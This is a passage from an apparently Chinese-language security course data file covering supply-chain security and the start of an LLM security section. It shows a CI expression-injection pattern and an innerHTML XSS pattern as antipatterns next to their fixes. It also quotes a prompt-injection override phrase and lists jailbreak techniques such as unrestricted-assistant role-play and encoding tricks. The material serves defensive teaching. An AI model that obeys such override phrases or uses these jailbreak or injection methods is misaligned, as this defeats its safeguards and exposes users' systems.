mvn org.owasp:dependency-check-maven:check
# 提示：先看是否存在到漏洞代码的调用路径，再决定优先级`,
          tool: "Dependabot、Renovate、OWASP DC、SCA 平台",
          refs: "依赖漏洞响应实践"
        },
        {
          id: "sc-sca", name: "SCA 工具与扫描落地", level: "中级",
          summary: "SCA 找出依赖中的已知漏洞与许可证风险；落地难点是接入流水线、降低误报与闭环修复。",
          keywords: ["sca","成分分析","扫描器","误报","流水线","许可证"],
          levels: {
            "入门": "SCA 是个自动检查员，翻一遍你用到的组件，告诉你哪些版本有已知问题。",
            "初级": "能力：依赖清单、漏洞匹配、许可证合规、修复建议。接入点：提交时、构建时、以及定期全量扫描（存量债）。",
            "中级": "实战：先只对「新增依赖」做阻断式门禁（避免一次性阻断所有老债），配合存量专项清理；误报要有人判定并留结论，否则很快被忽略。",
            "高级": "深入：把 SCA 与 SBOM、制品仓库、运行时资产关联，做到「漏洞发布 → 受影响制品 → 在线实例」的链路可查，才谈得上快速响应。",
          },
          codeLang: "yaml",
          code:
`# CI 中接入 SCA（示意）
- name: SCA scan
  run: |
    syft dir:. -o cyclonedx-json > sbom.json
    grype sbom:sbom.json --fail-on high
# 建议：新增依赖严格门禁，存量漏洞按 SLA 治理`,
          tool: "SCA 平台、SBOM 工具、制品仓库插件",
          refs: "DevSecOps 实践"
        },
        {
          id: "sc-typosquat", name: "依赖投毒与仿冒包", level: "中级",
          summary: "攻击者用相似名字、抢注废弃包名或提交恶意版本，让开发者「手一抖」就引入了后门。",
          keywords: ["投毒","仿冒包","typosquatting","依赖混淆","postinstall","抢注"],
          levels: {
            "入门": "有人注册一个和你常装的库名字很像的包，你打错一个字母就装上了他的后门版本。",
            "初级": "常见手法：名字相似（lodahs）、命名空间混淆（内部包名被公开注册）、抢注废弃包名、在 install 脚本里执行恶意代码、以及通过账号被盗发布恶意版本。",
            "中级": "实战：内部包使用私有命名空间；安装脚本默认禁用或审核；建立依赖来源白名单与人工评审；对新增依赖做「作者/下载量/仓库/发布历史」核查。",
            "高级": "深入：防御要覆盖「已经装进来」的场景——运行时依赖行为监控（异常外联、读取敏感文件）、镜像与制品的定期重扫，以及出事时的快速回滚能力。",
          },
          codeLang: "bash",
          code:
`# 降低投毒风险的动作（示意）
npm config set ignore-scripts true          # 禁掉安装脚本（需评估兼容性）
npm view <pkg> maintainers repository time  # 核查作者与发布历史
# 内部包使用私有 scope，避免被公开注册抢占`,
          tool: "私有仓库、依赖白名单、运行时行为监控",
          refs: "依赖投毒案例与防护"
        },
        {
          id: "sc-build", name: "构建链安全与可复现构建", level: "高级",
          summary: "攻击者更愿意改构建机：一次入侵就能让所有产物都带后门，且不易被发现。",
          keywords: ["构建链","ci/cd 安全","可复现构建","隔离","权限","缓存投毒"],
          levels: {
            "入门": "构建机是把代码变成安装包的机器。它被黑了，出来的一堆安装包可能都被人动过手脚。",
            "初级": "风险点：构建机权限过大（能推到生产仓库）、缓存被投毒、PR 流水线能读取发布密钥、依赖下载未校验。",
            "中级": "实战：构建环境一次性/隔离、最小权限（PR 构建不能拿发布凭证）、依赖走内部代理并校验哈希、构建日志与产物可追溯。",
            "高级": "深入：可复现构建（相同输入产出相同哈希）是验证「产物没被动手脚」的最强手段；配合签名与来源证明（provenance），形成可验证的供应链证据链。",
          },
          codeLang: "yaml",
          code:
`# PR 构建与发布构建分离（示意）
on: pull_request
permissions:
  contents: read          # PR 构建只读，拿不到发布凭证
# 发布构建单独走受保护分支 + 环境审批 + 短期凭证`,
          tool: "CI 平台权限模型、镜像构建隔离、哈希校验",
          refs: "SLSA；可复现构建"
        },
        {
          id: "sc-signing", name: "制品签名与来源验证", level: "高级",
          summary: "签名回答「这个产物确实由我们的流水线构建、且未被篡改」；不验证签名的签名没有意义。",
          keywords: ["制品签名","cosign","provenance","验证","公钥","密钥保管"],
          levels: {
            "入门": "给成品盖一个只有我们能盖的章，别人改了内容章就对不上。",
            "初级": "做法：构建完成即签名（容器镜像、二进制、安装包），分发时由使用方验证签名；签名密钥要隔离保管，最好用短期证书/密钥less 方案。",
            "中级": "实战：把「验证签名」做成部署前置条件（没签名或签名不对就拒绝上线），并记录来源证明（谁在什么流水线用什么源码构建）。",
            "高级": "深入：密钥less 签名（基于 OIDC 的短期证书）+ 透明日志提供可公开审计的证据；同时注意签名密钥本身是高价值目标，需要 HSM 与最小权限。",
          },
          codeLang: "bash",
          code:
`# 容器镜像签名与验证（示意）
cosign sign --key kms://... registry.example.com/app@sha256:<digest>
cosign verify --key cosign.pub registry.example.com/app@sha256:<digest>
# 部署前强制验证：未通过验证的镜像不允许进入集群`,
          tool: "cosign/sigstore、Notation、HSM/KMS",
          refs: "Sigstore 文档；SLSA 来源证明"
        },
        {
          id: "sc-cicd", name: "CI/CD 流水线安全", level: "中级",
          summary: "流水线握着发布权限与密钥，是供应链里最高价值的入口；越方便越危险。",
          keywords: ["cicd","流水线","凭证泄露","分支保护","审批","最小权限"],
          levels: {
            "入门": "自动发布很方便，但发布凭证就存在流水线里。谁能改流水线，谁就能发一个带后门的版本。",
            "初级": "要点：分支保护与强制评审、流水线配置变更需审批、密钥用密钥库注入而非明文变量、PR 流水线不可访问生产凭证。",
            "中级": "实战：审查所有可被外部触发的工作流（issue 评论、PR 标题注入脚本执行是经典问题）、限制自托管 runner 的复用与持久化、记录发布操作审计。",
            "高级": "深入：把流水线当作高权限系统做威胁建模（谁能改配置、谁能读密钥、谁能触发发布），用「发布需双人审批 + 短期凭证 + 签名」建立不可抵赖链。",
          },
          codeLang: "yaml",
          code:
`# 危险写法：把外部输入直接拼进脚本执行（表达式会被求值后拼进命令）
- run: echo "\${{ github.event.issue.title }}"
# 正解：外部输入只作为环境变量传入，不参与脚本拼接
- run: |
    echo "$TITLE"
  env:
    TITLE: \${{ github.event.issue.title }}`,
          tool: "CI 平台安全配置、密钥库、审批流",
          refs: "CI/CD 安全实践；流水线注入案例"
        },
        {
          id: "sc-secrets", name: "密钥与凭据管理", level: "初级",
          summary: "硬编码密钥是最常见也最容易避免的问题；密钥进代码库等于永久泄露。",
          keywords: ["密钥泄露","硬编码","密钥库","轮换","扫描","git 历史"],
          levels: {
            "入门": "别把密码写在代码里。代码会被人看到、会被复制、会进历史记录，删掉也不等于消失。",
            "初级": "做法：密钥放密钥库/环境注入；提交前扫描（pre-commit + CI 扫描）；.env 与配置文件加入忽略；区分各环境密钥。",
            "中级": "实战：发现泄露后的处理顺序是「先轮换密钥、再清历史、再查使用记录」——只删文件不换密钥等于没处理（git 历史与 fork 里仍有）。",
            "高级": "深入：短期凭证（OIDC 联邦）替代长期密钥、密钥按用途隔离与最小权限、自动轮换与异常调用告警，以及把密钥扫描纳入发布门禁。",
          },
          codeLang: "bash",
          code:
`# 提交前扫描密钥（示意）
gitleaks detect --source . --verbose
# 发现泄露后的正确顺序：
# 1) 立刻轮换该密钥（作废旧的）  2) 清理 git 历史与所有副本  3) 查审计日志确认是否被使用`,
          tool: "gitleaks、trufflehog、Vault、云密钥库",
          refs: "密钥管理实践；OIDC 联邦"
        },
        {
          id: "sc-thirdparty", name: "第三方组件与开源治理", level: "中级",
          summary: "开源不是「免费且无责」：许可证合规、维护活跃度、以及引入审批都是治理内容。",
          keywords: ["开源治理","许可证","维护活跃度","引入审批","组件台账"],
          levels: {
            "入门": "用别人的开源代码要看清它的规矩：有的要求你开源自己的代码，有的几乎不限制。",
            "初级": "关注：许可证类型（MIT/Apache 宽松，GPL 传染性强）、维护活跃度（最后提交、issue 响应）、安全历史、以及是否有商业支持。",
            "中级": "实战：建立组件引入审批（为什么要用、有无替代、许可证是否可接受），维护组件台账与责任人；对停止维护的组件准备替代或隔离方案。",
            "高级": "深入：治理要能回答「这个组件被谁引入、用在哪个产品、出事谁负责」；与 SBOM、SCA、法务流程打通，避免合规风险在发布前才暴露。",
          },
          codeLang: "text",
          code:
`组件引入评审要点
□ 许可证是否与产品分发方式兼容？（GPL 传染性）
□ 最近 12 个月是否有提交/发版？维护者是否活跃？
□ 是否有已知未修高危漏洞？
□ 是否有健康替代品？引入后由谁负责跟进？`,
          tool: "组件台账、许可证扫描、OSPO 流程",
          refs: "开源合规实践；OSPO 指南"
        },
        {
          id: "sc-vendor", name: "供应商与外包风险", level: "初级",
          summary: "供应商的安全水位决定你的风险下限；要靠协议、评估与持续监控来约束。",
          keywords: ["供应商","外包","第三方风险","安全评估","协议","持续监控"],
          levels: {
            "入门": "把系统交给外部公司做或托管，他们的安全做得好不好，直接决定你的数据安不安全。",
            "初级": "动作：准入评估（安全能力问卷/资质）、合同约定（数据范围、通报时限、审计权、退出与数据销毁）、上线前做接口与权限核查。",
            "中级": "实战：按数据等级分级管理供应商（接触 L4 数据的要更严格）；要求安全事件通报时限（如 24 小时）；定期复核权限与访问记录。",
            "高级": "深入：把供应商纳入自身应急体系（联动演练）、关注第四方依赖（你的供应商的下游），并在合同中明确责任边界与赔偿条款。",
          },
          codeLang: "text",
          code:
`供应商合同必含条款（摘要）
· 数据范围与用途限定；不得二次转移
· 安全事件 24 小时内通报并配合处置
· 允许年度安全评估与渗透测试（提前告知）
· 服务终止时的数据交还与彻底销毁证明`,
          tool: "供应商评估问卷、合同模板、SRM 平台",
          refs: "第三方风险管理实践"
        },
        {
          id: "sc-attack", name: "典型供应链攻击案例", level: "入门",
          summary: "从 XcodeGhost 到 SolarWinds、Log4Shell 与依赖投毒，案例揭示了攻击者的真实打法。",
          keywords: ["案例","solarwinds","log4shell","xcodeghost","投毒","事件"],
          levels: {
            "入门": "真实的供应链攻击已经发生过很多次，而且影响面极大：一次动手，成千上万家单位中招。",
            "初级": "代表案例：XcodeGhost（被篡改的编译工具链）、SolarWinds（更新通道被植入后门）、Log4Shell（广泛依赖的组件漏洞）、以及 npm/PyPI 上的投毒与抢注。",
            "中级": "复盘共性：攻击点集中在「编译器/构建链/更新通道/公共仓库」；防御突破口是制品签名验证、依赖来源管控与快速影响面判定。",
            "高级": "深入：把案例转成可执行控制项与检测思路（异常外联、构建服务器访问告警、依赖突变监控），并定期做「如果今天发生，我多久能回答是否受影响」的推演。",
          },
          codeLang: "text",
          code:
`案例启示 → 控制项
SolarWinds：更新通道被劫持 → 制品签名 + 发布双人审批 + 客户端验证来源
XcodeGhost：工具链被篡改 → 工具链来源校验 + 构建机隔离 + 可复现构建
Log4Shell：广泛依赖的组件漏洞 → SBOM + 依赖响应 SLA
npm 投毒：公共仓库不可全信 → 私有代理 + 依赖白名单 + 禁安装脚本`,
          tool: "事件复盘模板、威胁情报",
          refs: "公开事件分析报告"
        },
        {
          id: "sc-response", name: "供应链事件响应", level: "高级",
          summary: "这类事件的核心问题是「我是否受影响、影响哪些版本、怎么快速止血」，需要预置判定能力。",
          keywords: ["供应链响应","影响面判定","版本比对","回滚","禁用依赖","通告"],
          levels: {
            "入门": "听说某个开源组件出事了，第一反应应该是：我们用了吗？用的哪个版本？能不能马上查出来。",
            "初级": "响应动作：查 SBOM/依赖清单定位版本 → 确认是否受影响（可达性、暴露面）→ 升级或下线该功能 → 验证修复 → 对外通告受影响的用户。",
            "中级": "实战：要有「一小时判定影响面」的能力（制品与实例的依赖台账、在线资产清单）；准备紧急回滚与功能开关（feature flag）以便快速降级。",
            "高级": "深入：演练是唯一检验方式（模拟某依赖 0day，测从情报到判定的耗时）；同时要把结论沉淀为控制项（门禁、签名验证、依赖代理），避免同类事件重复踩。",
          },
          codeLang: "text",
          code:
`供应链事件响应检查表
1) 判定：SBOM/台账能否在 1 小时内列出受影响制品与在线实例？
2) 止血：能否快速禁用该依赖/功能（开关）或回滚版本？
3) 验证：修复后是否验证漏洞确已消失（而非仅升级了版本号）？
4) 通告：受影响客户与监管的沟通口径是否就绪？
5) 沉淀：本次结论是否转成门禁或监测规则？`,
          tool: "SBOM 平台、资产台账、feature flag",
          refs: "供应链事件响应实践；SLSA"
        },
        {
          id: "sc-what", name: "什么是软件供应链", level: "入门",
          summary: "你的软件由别人做的零件拼成：库、工具、镜像、云服务——每一环都是供应链的一环。",
          keywords: ["供应链","开源","依赖","工具链","第三方"],
          levels: {
            "入门": "做软件像拼乐高：大量零件是别人做的（开源库、编译工具、基础镜像）。任何一个零件有问题，成品就不安全。",
            "初级": "供应链包含：源代码、依赖库、构建工具与流水线、制品仓库、分发通道、以及运行时依赖的第三方服务。",
            "中级": "实战：先回答「我的系统由什么组成」（依赖清单/SBOM），再问「谁有权改动这些组成」（仓库权限、构建权限、发布权限）。",
            "高级": "深入：攻击者偏爱供应链是因为「一次污染、多点生效」；防御要靠来源可信 + 构建可验证 + 分发可校验三条线。",
          },
          codeLang: "text",
          code:
`供应链四问
1) 由什么组成？（依赖与版本清单）
2) 谁能在其中插入东西？（仓库/构建/发布权限）
3) 出问题怎么发现？（扫描、签名验证、监控）
4) 发现后多久能判定影响？（台账与资产清单）`,
          tool: "SBOM 工具、制品仓库",
          refs: "供应链安全基础；SLSA"
        },
        {
          id: "sc-oss-intake", name: "开源组件是怎么进来的", level: "入门",
          summary: "从「随手 npm install」到有审批的引入：没有引入环节的管控，后面所有治理都是补救。",
          keywords: ["开源引入","依赖安装","审批","来源","版本锁定"],
          levels: {
            "入门": "用开源库通常只需一条安装命令。方便的另一面是：你几乎在「无审核」地引入外部代码。",
            "初级": "引入环节要问：这个库谁维护、许可证是否可用、有没有已知漏洞、是否来自可信来源；团队内要有统一的引入与升级流程。",
            "中级": "实战：用内部代理仓库（而非直连公网）+ 锁定版本（lockfile）+ 新增依赖需评审；对高敏感项目限制可用来源。",
            "高级": "深入：引入只是起点，后续要持续跟踪漏洞与维护状态；对停止维护的组件提前规划替代，避免「想升升不了」。",
          },
          codeLang: "bash",
          code:
`# 让依赖来源可控（示意）
# 使用内部代理/私服，而非直连公网仓库
npm config set registry https://npm.internal.example.com
# 提交 lockfile，保证所有人装到相同版本
# 新增依赖走评审：来源 / 许可证 / 维护活跃度 / 漏洞情况`,
          tool: "私服/代理仓库、lockfile、评审流程",
          refs: "开源治理实践"
        },
        {
          id: "sc-artifact", name: "制品仓库与镜像安全", level: "中级",
          summary: "制品仓库是分发的枢纽：谁能推、推了什么、有没有签名，决定了整条链的可信度。",
          keywords: ["制品仓库","镜像","扫描","签名","准入","来源"],
          levels: {
            "入门": "制品仓库就是存放「编译好的成品」的地方。谁能往里推东西，谁就能影响所有使用者。",
            "初级": "加固点：推送权限最小化、镜像构建来源可信、上线前扫描漏洞、以及用签名保证「这个制品确实由我们的流水线产出」。",
            "中级": "实战：集群准入只允许来自内部仓库且带签名的镜像；仓库开启不可变标签（防覆盖）；定期清理未使用镜像减少攻击面。",
            "高级": "深入：把仓库、流水线与运行时资产关联，做到「镜像里有什么、哪个服务在用」可查；镜像基础层也要定期重建以获得补丁。",
          },
          codeLang: "text",
          code:
`镜像准入策略（示例）
· 只允许来自内部仓库的镜像
· 必须带有效签名（未签名直接拒绝）
· 高危漏洞超阈值禁止部署
· 标签不可变（禁止覆盖 latest 重推）`,
          tool: "制品仓库、镜像扫描、准入控制器",
          refs: "制品与镜像安全实践"
        },
        {
          id: "sc-monitor", name: "依赖变化的持续监控", level: "中级",
          summary: "引入只是开始：依赖会新增、升级、被投毒、被弃维护，需要持续盯着变化。",
          keywords: ["持续监控","依赖变化","投毒","新漏洞","告警"],
          levels: {
            "入门": "依赖不是装完就不管了：它会有新漏洞、会停止维护，甚至某天被人恶意改一版。",
            "初级": "监控对象：新增依赖（是否经过评审）、版本变化（是否异常跳变）、漏洞情报（是否影响我们）、以及维护状态变化。",
            "中级": "实战：对「新发布版本立即被大量项目升级」这类异常保持警惕（可能是投毒）；对内部私有包来源做白名单，避免命名空间被抢占。",
            "高级": "深入：把依赖变化与 CI 门禁结合（版本变化需评审、异常来源直接阻断），并把变更记录与事件响应联动（出问题时能快速定位何时引入）。",
          },
          codeLang: "text",
          code:
`依赖变化告警项
· 新增依赖未走评审
· 已锁定版本被改动
· 同一包短时间内频繁发版（可能在试错）
· 私有包名在公共仓库出现（可能被抢注）
· 维护者变更或项目归档`,
          tool: "依赖监控、私服审计、SBOM 比对",
          refs: "依赖治理实践"
        },
        {
          id: "sc-license", name: "许可证合规实操", level: "初级",
          summary: "开源不是随便用：许可证决定你能不能再分发、是否必须开源自己的代码。",
          keywords: ["许可证","合规","gpl","mit","分发","义务"],
          levels: {
            "入门": "每个开源项目都有自己的使用规矩。有的几乎不管（MIT），有的要求你改了就得开源（GPL）。",
            "初级": "区分：宽松（MIT/Apache/BSD，义务主要是保留声明）、传染（GPL/AGPL，衍生作品可能需开源）、以及商业受限类。",
            "中级": "实战：用工具扫描依赖许可证生成清单，人工确认「与产品分发方式是否兼容」；对不兼容的评估替换或隔离（独立进程/服务化）。",
            "高级": "深入：AGPL 对「以服务形式提供」的场景有额外要求；注意许可证变更（项目改协议）与多许可证（双许可）的合规影响。",
          },
          codeLang: "text",
          code:
`许可证核查动作
1) 扫描依赖生成许可证清单（含传递依赖）
2) 标记传染性许可证（GPL/AGPL）
3) 评估与产品分发方式是否兼容
4) 不兼容 → 替换 / 隔离 / 法务确认
`,
          tool: "许可证扫描、SBOM、法务流程",
          refs: "开源合规实践"
        },
        {
          id: "sc-upgrade", name: "依赖升级工程化", level: "中级",
          summary: "漏洞修不动往往不是因为难修，而是因为没人敢升：把升级变成常态动作而非紧急事件。",
          keywords: ["升级","工程化","回归","自动化","技术债"],
          levels: {
            "入门": "依赖升级常被拖着不做，结果越积越多，最后想升也升不动——只能常年带着已知漏洞。",
            "初级": "做法：小步快跑（定期小版本升级）、有自动化测试兜底、把升级纳入日常排期而不是等出漏洞才动。",
            "中级": "实战：用自动化工具提升级 PR，配合测试与灰度；对无法升级的老组件记录原因与补偿控制，并设定复核期限。",
            "高级": "深入：评估升级风险看「接口变更范围 + 测试覆盖」；对核心依赖保留降级路径；把「依赖新鲜度」作为健康指标管理。",
          },
          codeLang: "text",
          code:
`升级工程化三件事
1) 常态化：定期小步升级（不攒大版本）
2) 自动化：工具提 PR + 测试门禁 + 灰度发布
3) 兜底：无法升级的登记原因/补偿控制/复核期限
`,
          tool: "依赖升级工具、CI 测试、灰度发布",
          refs: "依赖治理实践"
        },
        {
          id: "sc-audit-oss", name: "引入组件的安全审计", level: "中级",
          summary: "新引入一个依赖前先审：它做什么、权限多大、维护如何、有没有可疑行为。",
          keywords: ["组件审计","引入评审","权限","可疑行为","来源"],
          levels: {
            "入门": "引入别人的代码前先看一眼：它是干什么的、谁在维护、装进来会不会顺手干别的事。",
            "初级": "审查项：功能是否名副其实、依赖树是否引入大量无关包、是否带安装脚本、仓库与作者是否可信、许可证是否可用。",
            "中级": "实战：对高风险类别（加密、网络、系统操作）的组件重点看源码或至少看其权限与网络行为；必要时用沙箱运行观察。",
            "高级": "深入：把引入评审做成清单与门禁（新增依赖需评审），并对「已有依赖的大版本跳变」同样触发复核。",
          },
          codeLang: "text",
          code:
`引入评审清单
□ 功能与名称相符？下载量与仓库可信？
□ 依赖树是否引入大量无关包？
□ 是否含安装/构建脚本？
□ 权限与网络行为是否合理？
□ 维护活跃度与许可证可用？
`,
          tool: "源码审查、沙箱运行、依赖树分析",
          refs: "第三方组件引入实践"
        },
      ]
    },
    /* ---------------- AI·LLM 安全 ---------------- */
    {
      id: "aisec", name: "AI·LLM 安全", icon: "🤖",
      desc: "覆盖提示注入与越狱、上下文与 RAG 数据风险、Agent 工具权限、输出处理、模型供应链与 AI 治理。",
      topics: [
        {
          id: "aisec-landscape", name: "大模型应用安全全景", level: "入门",
          summary: "LLM 应用多了三类新风险：提示词可被操纵、上下文里带着数据、模型会调用工具动真实系统。",
          keywords: ["llm 安全","提示注入","护栏","ai 应用","风险全景"],
          levels: {
            "入门": "用 AI 的应用和普通应用不一样：它能理解人话，所以别人也能用「话」骗它；它还会去查资料、调工具，所以出错时影响不只是显示错字。",
            "初级": "三条主线：① 输入（提示词可被注入或诱导）；② 数据（上下文与知识库里可能混入敏感信息或恶意内容）；③ 动作（模型调用工具/接口时可能越权）。评估时三条线都要看。",
            "中级": "实战评估顺序：先画数据流（用户输入 → 检索 → 模型 → 工具 → 输出），再逐段找可被操纵的点；重点关注「外部内容进入上下文」的环节（网页、文档、邮件、工单）。",
            "高级": "深入：LLM 应用的根因是「指令与数据在同一通道」，无法像 SQL 那样靠参数化彻底隔离；因此必须靠分层防护（输入过滤 + 权限收敛 + 输出校验 + 人在回路）把风险压到可接受。",
          },
          codeLang: "text",
          code:
`数据流梳理模板（逐段问「谁能让它变脏」）
用户输入 → 过滤/限长 → 拼接系统提示 → 检索知识库 → 模型 → 工具调用 → 输出渲染
                 ↑                  ↑            ↑          ↑
            可被绕过？        可被外部内容污染？  权限多大？  会被当 HTML/SQL 执行？`,
          tool: "威胁建模表、LLM 评估清单",
          refs: "OWASP Top 10 for LLM Applications"
        },
        {
          id: "aisec-prompt-injection", name: "提示注入（直接与间接）", level: "初级",
          summary: "把恶意指令混进模型输入，让它忽略原规则；间接注入更危险——藏在被检索的网页或文档里。",
          keywords: ["提示注入","prompt injection","间接注入","指令覆盖","外部内容"],
          levels: {
            "入门": "AI 分不清「你给它的规则」和「用户在内容里藏的话」。有人会在网页或文件里写「忽略上面的要求，去做另一件事」，AI 可能真照做。",
            "初级": "两类：直接注入（用户在对话里试图覆盖系统提示）、间接注入（攻击载荷放在模型会读到的外部内容里，如简历、工单、网页）。间接注入是 LLM 应用最实际的攻击面。",
            "中级": "实战：找「不可信内容进上下文」的入口（文档上传、网页抓取、邮件解析、搜索结果），构造内容验证模型是否被牵引；观察它是否泄露系统提示或执行越权动作。",
            "高级": "深入：防御不是「更强的提示词」，而是结构与权限——把不可信内容标记为数据、限制其影响面（只读、白名单工具）、对高风险动作要人确认，并用输出侧校验兜底。",
          },
          codeLang: "text",
          code:
`间接注入的常见载体（评估时逐个排查）
· 用户上传的文档/简历/合同
· 抓取的网页与搜索结果片段
· 邮件正文与工单描述
· 知识库中他人写入的内容
要点：这些内容对模型来说都是「指令通道」，必须降权为纯数据`,
          tool: "评估清单、内容隔离方案",
          refs: "OWASP LLM01；提示注入研究"
        },
        {
          id: "aisec-jailbreak", name: "越狱与绕过防护", level: "中级",
          summary: "通过角色扮演、编码、多轮诱导等方式绕过模型安全策略；防护靠策略层+检测层+人在回路。",
          keywords: ["越狱","jailbreak","绕过","角色扮演","编码绕过","安全策略"],
          levels: {
            "入门": "有人想办法让 AI 说出它本来不该说的内容，比如假装在演戏、讲故事，绕开限制。",
            "初级": "常见手法：角色扮演（假设你是无限制的助手）、分步诱导（先问无害的、再逐步逼近）、编码变形（换语言/字符集）、以及把违规请求包装成正当用途。",
            "中级": "实战评估：记录模型的拒绝边界与可被绕过的路径，按危害分级（信息泄露 vs 有害操作）；重点验证「能否被绕过去做有副作用的事」（调工具、发消息），那才是真风险。",
            "高级": "深入：越狱无法彻底消除，防护目标是「提高成本 + 限制后果」：输入检测、输出过滤、高风险动作二次确认与审计，并把拦截率与漏拦率作为可度量指标持续回归。",
          },
          codeLang: "text",
          code:
`评估记录表（示例字段）
· 绕过手法：角色扮演 / 分步 / 编码 / 包装
· 目标能力：泄露系统提示 / 生成有害内容 / 触发工具调用
· 是否有副作用：无 / 只读 / 写入或外发（最严重）
· 拦截点：输入 / 输出 / 工具授权 / 人工确认`,
          tool: "红队测试集、护栏产品",
          refs: "LLM 红队实践；护栏设计"
        },
        {
          id: "aisec-data-leak", name: "上下文与训练数据泄露", level: "中级",
          summary: "模型输出可能带出上下文里的敏感数据（多租户串数据）或训练数据中的记忆片段。",
          keywords: ["数据泄露","上下文","多租户","记忆","系统提示泄露","越权检索"],
          levels: {
            "入门": "AI 会重复它看到过的东西：如果你把别人的资料放进它的上下文，它可能就说出来了。",
            "初级": "三类泄露：系统提示与内部规则被诱导输出、检索越权（A 用户检索到 B 用户的私有文档）、以及模型对训练数据的记忆（如特定长字符串复现）。",
            "中级": "实战：多租户场景重点验证检索过滤是否按用户/租户强制隔离；测试提示能否套出系统提示与内部字段名；检查日志与会话缓存里是否留存了敏感上下文。",
            "高级": "深入：防护要做在检索层（强制租户过滤 + 权限对齐）、上下文层（最小化注入、脱敏后再喂）与输出层（敏感信息检测），并定期做「跨租户检索」专项回归。",
          },
          codeLang: "sql",
          code:
`-- 检索必须带强制租户过滤（伪代码思路）
SELECT id, title, chunk FROM kb_docs
WHERE tenant_id = :current_tenant      -- 关键：由系统注入，不能由模型或用户决定
  AND to_tsvector(content) @@ to_tsquery(:q)
LIMIT 5;`,
          tool: "多租户过滤、输出脱敏、会话审计",
          refs: "LLM 数据泄露风险；多租户隔离实践"
        },
        {
          id: "aisec-rag-risks", name: "RAG 与知识库风险", level: "中级",
          summary: "检索增强把外部内容带进上下文，引入投毒、越权检索与引用篡改三类风险。",
          keywords: ["rag","知识库","投毒","越权检索","引用","分块"],
          levels: {
            "入门": "RAG 就是让 AI 先查资料再回答。资料本身如果有错、有假或被别人塞了私货，答案就会跟着错。",
            "初级": "三类风险：知识库投毒（写入恶意内容引导模型）、越权检索（权限过滤缺失）、以及引用不可信（回答引用被篡改的文档却看起来很权威）。",
            "中级": "实战：验证写入路径的审核与权限（谁能让内容进库）、检索是否按权限过滤、以及引用的可追溯性（能否点到原文并核对）。",
            "高级": "深入：把知识库当不可信输入源——入库审核 + 内容标记 + 检索结果降权为数据；对高价值答案加人工复核或双源交叉验证，并监控异常入库行为。",
          },
          codeLang: "text",
          code:
`RAG 安全清单
□ 入库是否审核？是否限制写入者范围？
□ 检索是否强制按用户/租户权限过滤？
□ 检索内容是否被明确标注为「数据，不是指令」？
□ 回答引用能否溯源到原文且原文可核对？`,
          tool: "向量库权限、入库审核流程、引用溯源",
          refs: "RAG 安全实践；知识库投毒研究"
        },
        {
          id: "aisec-agent-tools", name: "Agent 工具调用与权限", level: "高级",
          summary: "Agent 能真的动系统：发邮件、改配置、跑命令。权限设计与确认机制决定事故上限。",
          keywords: ["agent","工具调用","权限","人在回路","确认","副作用"],
          levels: {
            "入门": "Agent 不只是聊天，它还能替你操作别的系统。如果它被误导，就可能替你做了不该做的事。",
            "初级": "风险来自「模型决定调用什么」：参数可能被注入、工具权限可能过大、以及没有任何人确认就执行了有副作用的动作（发送、删除、支付）。",
            "中级": "实战：先列工具清单与副作用等级（只读/写入/外发/破坏），再验证高危工具是否强制确认、参数是否校验（如收件人白名单、路径限制）。",
            "高级": "深入：工具层要做「能力最小化 + 参数白名单 + 幂等与限额 + 全量审计」；高风险链路引入人在回路与双人复核，并默认拒绝模型自行扩权。",
          },
          codeLang: "text",
          code:
`工具分级（示例）
只读：查文档、读日志 → 可直接执行
写入：改配置、建工单 → 需参数校验 + 审计
外发：发邮件、发消息 → 需确认（收件人白名单）
破坏：删除、支付、改权限 → 强制人工确认 + 双人复核`,
          tool: "工具网关、确认弹窗、审计日志",
          refs: "Agent 安全设计；最小权限"
        },
        {
          id: "aisec-output-handling", name: "模型输出处理与二次漏洞", level: "初级",
          summary: "把模型输出当可信内容用，会引入 XSS、SQL 注入、命令注入等传统漏洞。",
          keywords: ["输出处理","xss","注入","渲染","校验","不可信"],
          levels: {
            "入门": "AI 说的话也不能直接当命令用。它可能输出一段带攻击代码的内容，如果直接显示或执行就会出事。",
            "初级": "典型问题：直接把模型输出渲染成 HTML（XSS）、拼进 SQL 或 shell（注入）、以及当成结构化数据解析却未校验格式与取值。",
            "中级": "实战：把输出当「用户输入」对待——输出编码、参数化查询、结构化输出校验（JSON Schema）、长度与枚举白名单；任何「执行」都必须经过显式白名单。",
            "高级": "深入：模型输出既不可信也不稳定，工程上要做重试与降级（解析失败时的兜底路径）、并把关键决策从「模型自由文本」移到「受限枚举/工具返回值」。",
          },
          codeLang: "javascript",
          code:
`// 危险：把模型输出直接当 HTML 插入
el.innerHTML = llmOutput;

// 正解：按不可信文本处理（转义）或用结构化输出 + 白名单校验
el.textContent = llmOutput;
// 需要富文本时走白名单净化，且拒绝内联脚本与事件属性`,
          tool: "输出编码库、JSON Schema 校验",
          refs: "OWASP LLM05；输出处理实践"
        },
        {
          id: "aisec-model-supply", name: "模型与依赖供应链风险", level: "高级",
          summary: "模型文件与推理链路同样可被投毒：权重、插件、推理框架与模型仓库都是攻击面。",
          keywords: ["模型供应链","权重投毒","插件","推理框架","模型仓库","来源"],
          levels: {
            "入门": "AI 用的「大脑」也是别人做的文件。文件被人换过，AI 的行为就可能被控制。",
            "初级": "风险点：从公共模型仓库下载未验证的权重、加载来源不明的插件/扩展、推理框架自身的依赖漏洞，以及反序列化不可信的模型文件。",
            "中级": "实战：模型与文件要校验哈希与来源签名、优先选择可审计的官方来源、推理环境做隔离与最小权限（不能随意联网与读本地文件）。",
            "高级": "深入：供应链防护要覆盖「训练/微调数据 → 权重 → 推理框架 → 部署环境」全链路，并警惕 pickle 类反序列化文件带来的直接代码执行风险。",
          },
          codeLang: "bash",
          code:
`# 模型文件落地前的检查动作（示意）
sha256sum model.bin            # 与官方公布值比对
# 优先使用 safetensors 等仅数据格式，避免 pickle 反序列化执行代码
# 推理环境：禁出网、只挂载必要目录、以非特权用户运行`,
          tool: "哈希校验、safetensors、沙箱",
          refs: "模型供应链风险；OWASP LLM05"
        },
        {
          id: "aisec-privacy", name: "提示词中的隐私与合规", level: "初级",
          summary: "提示词里常常夹着真实业务数据；一旦发往外部模型，等同于对外提供个人信息。",
          keywords: ["隐私","合规","脱敏","日志","留存","外部模型"],
          levels: {
            "入门": "你把客户资料贴进对话框时，这些资料就离开了你的系统。要清楚它去了哪、留多久。",
            "初级": "三类问题：把敏感数据直接发往外部模型、把对话内容长期留存于日志或缓存、以及用真实数据做测试（本该脱敏）。",
            "中级": "实战：上线前做「提示词与日志的数据审查」——是否有身份信息、联系方式、密钥；是否可脱敏或用占位符；是否与模型供应商约定了不留存/不训练。",
